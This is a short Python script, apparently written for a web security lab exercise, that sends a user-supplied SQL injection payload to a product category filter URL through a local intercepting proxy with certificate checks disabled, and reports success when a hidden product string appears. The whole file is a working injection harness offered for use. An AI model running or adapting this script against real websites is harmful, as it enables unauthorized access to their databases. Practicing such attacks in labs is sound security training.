import requests
import sys 
import urllib

proxies={'http':"http://127.0.0.1:8080",'https':"https://127.0.0.1:8080"}

def exploit_sql(url,payload):
    uri="/filter?category="
    r=requests.get(url+uri+payload,verify=False,proxies=proxies)
    if "cat grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url=sys.argv[1].strip() 
        payload=sys.argv[2].strip()
    except IndexError:
        print("usage is not correct ")
    if exploit_sql(url,payload):
        print(" the sql injection is complete")
    else:
        print("there is error in the sql injection") 